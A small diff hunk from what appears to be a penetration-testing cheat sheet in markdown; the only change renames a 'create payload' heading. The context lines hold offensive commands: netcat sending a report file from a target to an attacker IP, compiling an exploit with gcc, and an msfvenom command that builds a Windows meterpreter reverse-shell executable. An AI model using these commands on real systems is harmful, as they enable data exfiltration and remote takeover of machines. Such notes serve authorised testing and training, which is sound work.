@@ -220,7 +220,7 @@ Command on target: `nc.exe 192.168.xxx.xxx 443 -w 3 < report.html`<br/>
 Exploit mostly written in c.<br/>
 `gcc -o exploit EXPLOIT.c `<br/>
 
-## create payload (with shellerator):
+## create payload:
 `shellrator.py `<br/>
 
 windows: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe` <br/>
